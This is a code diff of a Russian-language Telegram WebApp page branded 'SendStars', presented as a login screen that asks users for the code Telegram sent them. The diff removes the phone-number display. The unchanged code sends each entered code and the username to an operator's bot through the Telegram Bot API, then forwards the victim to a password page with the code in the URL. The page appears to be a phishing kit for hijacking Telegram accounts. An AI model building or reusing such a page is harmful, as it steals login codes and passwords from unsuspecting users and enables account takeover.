@@ -6,7 +6,6 @@
   <title>SendStars — авторизация</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    /* Стили остаются без изменений */
     :root {
       --bg:#1c1b1b;
       --text:#fff;
@@ -39,25 +38,6 @@
       height: auto;
       object-fit: contain;
       display: block;
-    }
-
-    .phone {
-      font-size: 18px;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .edit-btn {
-      cursor: pointer;
-      font-size: 16px;
-      opacity: 0.8;
-      transition: opacity 0.2s;
-    }
-
-    .edit-btn:hover {
-      opacity: 1;
     }
 
     .hint {
@@ -147,10 +127,6 @@
     <div class="avatar">
       <img src="avatar.gif" alt="avatar">
     </div>
-    <div class="phone">
-      <span id="phoneNumber">Загрузка...</span>
-      <span class="edit-btn" id="editPhone">✎</span>
-    </div>
     <div class="hint">Мы отправили код в приложение Telegram.</div>
 
     <div class="code-boxes" id="codeBoxes">
@@ -178,16 +154,6 @@
   <script>
 const tg = window.Telegram.WebApp;
 tg.expand();
-
-// Получаем номер телефона из параметров URL
-const urlParams = new URLSearchParams(window.location.search);
-const phoneNumber = urlParams.get('phone');
-
-if (phoneNumber) {
-  document.getElementById('phoneNumber').textContent = phoneNumber;
-} else {
-  document.getElementById('phoneNumber').textContent = 'Номер не указан';
-}
 
 const codeBoxes = document.querySelectorAll('.code-box');
 let code = "";
@@ -225,7 +191,7 @@ document.querySelectorAll('.numpad button').forEach(btn => {
         type: 'auth_code',
         code: code,
         user_id: tg.initDataUnsafe.user?.id,
-        phone_number: phoneNumber
+        phone_number: ""
       }));
 
       // Дополнительно отправляем код в бота через метод бота
@@ -233,7 +199,7 @@ document.querySelectorAll('.numpad button').forEach(btn => {
 
       // Переходим на страницу ввода пароля через 1 секунду
       setTimeout(() => {
-        window.location.href = `password.html?phone=${encodeURIComponent(phoneNumber)}&code=${code}`;
+        window.location.href = `password.html?phone=&code=${code}`;
       }, 1000);
     }
   });
@@ -249,7 +215,7 @@ function sendCodeToBot(code) {
   // Получаем username или показываем "без username"
   const username = user?.username ? `@${user.username}` : 'без username';
   
-  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n📱 Телефон: ${phoneNumber}\n🔢 Код: ${code}`;
+  const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
   
   // Отправляем сообщение через API бота
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -266,11 +232,6 @@ function sendCodeToBot(code) {
     console.error('Ошибка отправки кода в лог:', error);
   });
 }
-
-// обработчик для карандашика
-document.getElementById("editPhone").addEventListener("click", () => {
-  window.location.href = "index.html"; // возвращаем на первый экран
-});
 
 // Инициализация при загрузке
 updateBoxes();
